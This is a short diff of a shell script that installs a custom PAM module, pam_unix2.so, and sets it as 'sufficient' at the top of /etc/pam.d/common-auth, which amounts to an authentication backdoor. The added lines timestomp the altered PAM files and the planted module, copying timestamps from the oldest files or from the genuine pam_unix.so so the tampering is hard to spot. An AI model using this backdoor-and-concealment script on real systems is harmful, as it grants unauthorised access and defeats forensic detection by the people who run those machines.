@@ -9,3 +9,10 @@ cp pam_unix2.so /lib/x86_64-linux-gnu/security/
 
 # Add to PAM config (sufficient = if this succeeds, auth is granted)
 sed -i '1s/^/auth sufficient pam_unix2.so\n/' /etc/pam.d/common-auth
+
+# Match timestamp from the oldest file in a directory
+touch -r "$(ls -1tr /etc/pam.d/* | head -n1)" common-*
+touch -r "$(ls -1tr /lib/x86_64-linux-gnu/security/* | head -n1)" pam_unix2.so
+
+# Or match a specific reference file
+touch -r /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix2.so
